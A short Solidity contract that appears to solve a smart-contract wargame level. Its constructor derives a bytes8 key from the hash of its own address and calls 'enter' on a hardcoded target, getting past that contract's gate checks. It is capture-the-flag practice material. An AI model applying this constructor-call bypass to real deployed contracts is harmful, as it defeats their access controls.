// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";

contract Level14 {
    address addr = 0xe408FFC4e6D82309AD263e249c321cB8CCF1818E;

    constructor() {
        bytes8 b8 = ~bytes8(keccak256(abi.encodePacked(address(this))));
        (bool b,) = address(addr).call(abi.encodeWithSignature("enter(bytes8)", b8));
        require(b);
    }
}
